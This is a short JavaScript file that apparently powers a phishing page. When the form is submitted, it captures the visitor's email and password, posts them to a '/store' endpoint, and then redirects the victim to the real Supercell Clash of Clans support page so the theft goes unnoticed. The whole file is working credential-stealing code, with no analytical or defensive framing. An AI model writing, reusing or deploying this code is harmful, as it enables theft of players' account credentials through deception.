const submitB = document.getElementById('submitB');

submitB.addEventListener('click', e => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    fetch('/store', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: email,
            password: password
        })
    }).then(res => res.json()).then(res => {
        window.location.replace('https://support.supercell.com/clash-of-clans/en/index.html')
    })
})